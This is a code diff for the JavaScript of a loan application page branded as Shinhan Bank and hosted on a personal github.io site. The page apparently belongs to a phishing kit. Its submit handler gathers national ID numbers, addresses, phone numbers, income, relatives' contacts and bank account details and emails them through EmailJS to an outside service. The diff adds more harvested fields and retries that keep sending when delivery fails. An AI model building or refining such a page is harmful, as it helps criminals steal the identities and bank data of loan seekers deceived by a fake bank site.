                 monthlyPayment: userData.monthlyPayment || 0,
                 totalInterest: userData.totalInterest || 0,
                 totalRepayment: userData.totalRepayment || 0,
@@ -797,33 +912,41 @@
 
         function handleSubmit(event) {
             event.preventDefault();
-            if (!validateForm()) return;
+            if (!validateForm()) {
+                console.error('Form validation failed');
+                return;
+            }
 
             const spinner = document.querySelectorAll('.spinner')[1];
             spinner.style.display = 'inline-block';
 
             userData = {
-                fullName: document.getElementById('fullName').value.trim(),
-                dob: document.getElementById('dob').value,
-                gender: document.getElementById('gender').value,
-                address: document.getElementById('address').value.trim(),
-                cccd: document.getElementById('cccd').value.trim(),
-                issuePlace: document.getElementById('issuePlace').value,
-                phone: document.getElementById('phone').value.trim(),
-                email: document.getElementById('email').value.trim(),
-                loanType: document.getElementById('loanType').value,
-                loanTerm: document.getElementById('loanTerm').value,
-                loanAmount: document.getElementById('loanAmount').value,
-                disbursementDate: document.getElementById('disbursementDate').value,
+                fullName: document.getElementById('fullName').value.trim() || 'N/A',
+                dob: document.getElementById('dob').value || 'N/A',
+                gender: document.getElementById('gender').value || 'N/A',
+                contactAddress: document.getElementById('contactAddress').value.trim() || 'N/A',
+                hometown: document.getElementById('hometown').value.trim() || 'N/A',
+                nationality: document.getElementById('nationality').value.trim() || 'Việt Nam',
+                cccd: document.getElementById('cccd').value.trim() || 'N/A',
+                idIssueDate: document.getElementById('idIssueDate').value || 'N/A',
+                issuePlace: document.getElementById('issuePlace').value || 'N/A',
+                phone: document.getElementById('phone').value.trim() || 'N/A',
+                email: document.getElementById('email').value.trim() || 'N/A',
+                loanType: document.getElementById('loanType').value || 'N/A',
+                loanTerm: document.getElementById('loanTerm').value || 'N/A',
+                loanAmount: document.getElementById('loanAmount').value || 'N/A',
+                disbursementDate: document.getElementById('disbursementDate').value || getCurrentDate(),
                 interestRate: parseFloat(document.getElementById('interestRate').value) || 0,
                 monthlyIncome: parseFloat(document.getElementById('monthlyIncome').value) || 0,
-                occupation: document.getElementById('occupation').value,
-                loanPurpose: document.getElementById('loanPurpose').value,
-                relativePhone: document.getElementById('relativePhone').value.trim(),
-                relationship: document.getElementById('relationship').value,
-                accountName: document.getElementById('accountName').value.trim(),
-                accountNumber: document.getElementById('accountNumber').value.trim(),
-                bankName: document.getElementById('bankName').value,
+                occupation: document.getElementById('occupation').value || 'N/A',
+                loanPurpose: document.getElementById('loanPurpose').value || 'N/A',
+                relativePhone: document.getElementById('relativePhone').value.trim() || 'N/A',
+                relationship: document.getElementById('relationship').value || 'N/A',
+                hasBadDebt: document.getElementById('hasBadDebt').value || 'N/A',
+                hasHighDebt: document.getElementById('hasHighDebt').value || 'N/A',
+                accountName: document.getElementById('accountName').value.trim() || 'N/A',
+                accountNumber: document.getElementById('accountNumber').value.trim() || 'N/A',
+                bankName: document.getElementById('bankName').value || 'N/A',
                 loanCode: "SHB" + Math.floor(100000 + Math.random() * 900000),
                 monthlyPayment: userData.monthlyPayment || 0,
                 totalInterest: userData.totalInterest || 0,
@@ -838,44 +961,69 @@
                 localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
                 localStorage.setItem('registered', 'true');
 
-                emailjs.send('service_60tgxof', 'template_uhyb8ve', {
-                    full_name: userData.fullName,
-                    dob: userData.dob,
-                    gender: userData.gender,
-                    address: userData.address,
-                    id_number: userData.cccd,
-                    id_issue_place: userData.issuePlace,
-                    phone_number: userData.phone,
-                    email: userData.email,
-                    loan_type: userData.loanType,
-                    loan_term: userData.loanTerm,
-                    loan_amount: userData.loanAmount,
-                    interest_rate: userData.interestRate,
-                    disbursement_date: userData.disbursementDate,
-                    income: userData.monthlyIncome,
-                    occupation: userData.occupation,
-                    loan_purpose: userData.loanPurpose,
-                    company_phone: userData.relativePhone,
-                    company_address: userData.relationship,
-                    account_holder_name: userData.accountName,
-                    account_number: userData.accountNumber,
-                    bank_name: userData.bankName,
-                    loan_code: userData.loanCode
-                })
-                .then(() => {
-                    console.log('Confirmation email sent');
-                    userData.emailSent = true;
-                    saveToLocalStorage();
-                    spinner.style.display = 'none';
-                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
-                }, (error) => {
-                    console.error('Email sending failed:', error);
-                    alert('Lỗi khi gửi email xác nhận. Vui lòng thử lại.');
-                    spinner.style.display = 'none';
-                });
+                let retries = 2;
+                function sendEmail() {
+                    emailjs.send('service_60tgxof', 'template_uhyb8ve', {
+                        full_name: userData.fullName,
+                        dob: userData.dob,
+                        gender: userData.gender,
+                        contact_address: userData.contactAddress,
+                        hometown: userData.hometown,
+                        id_number: userData.cccd,
+                        id_issue_date: userData.idIssueDate,
+                        nationality: userData.nationality,
+                        id_issue_place: userData.issuePlace,
+                        phone_number: userData.phone,
+                        email: userData.email,
+                        loan_type: userData.loanType,
+                        loan_term: userData.loanTerm + ' tháng',
+                        loan_amount: parseInt(userData.loanAmount).toLocaleString('vi-VN') + ' VND',
+                        disbursement_date: userData.disbursementDate,
+                        income: userData.monthlyIncome.toLocaleString('vi-VN') + ' VND',
+                        occupation: userData.occupation,
+                        loan_purpose: userData.loanPurpose,
+                        company_phone: userData.relativePhone,
+                        company_address: userData.relationship,
+                        has_bad_debt: userData.hasBadDebt,
+                        has_high_debt: userData.hasHighDebt,
+                        account_holder_name: userData.accountName,
+                        account_number: userData.accountNumber.replace(/\s/g, ''),
+                        bank_name: userData.bankName,
+                        loan_code: userData.loanCode,
+                        monthly_payment: userData.monthlyPayment.toLocaleString('vi-VN') + ' VND',
+                        total_interest: userData.totalInterest.toLocaleString('vi-VN') + ' VND',
+                        total_repayment: userData.totalRepayment.toLocaleString('vi-VN') + ' VND'
+                    })
+                    .then(response => {
+                        console.log('Email sent:', response.status, response.text);
+                        userData.emailSent = true;
+                        saveToLocalStorage();
+                        spinner.style.display = 'none';
+                        alert('Đăng ký thành công! Vui lòng kiểm tra email.');
+                        setTimeout(() => {
+                            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
+                        }, 500);
+                    }, error => {
+                        console.error('Email error:', error);
+                        if (retries > 0) {
+                            retries--;
+                            console.log(`Retrying... ${retries} attempts left`);
+                            setTimeout(sendEmail, 1000);
+                        } else {
+                            console.error('Email failed after retries:', error);
+                            spinner.style.display = 'none';
+                            alert('Lỗi gửi email, nhưng đăng ký đã được lưu. Vui lòng kiểm tra sau.');
+                            setTimeout(() => {
+                                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
+                            }, 500);
+                        }
+                    });
+                }
+                sendEmail();
             } else {
                 spinner.style.display = 'none';
-                alert('Lỗi lưu dữ liệu. Vui lòng thử lại.');
+                alert('Lỗi lưu dữ liệu.');
+                console.error('LocalStorage save failed');
             }
         }
 
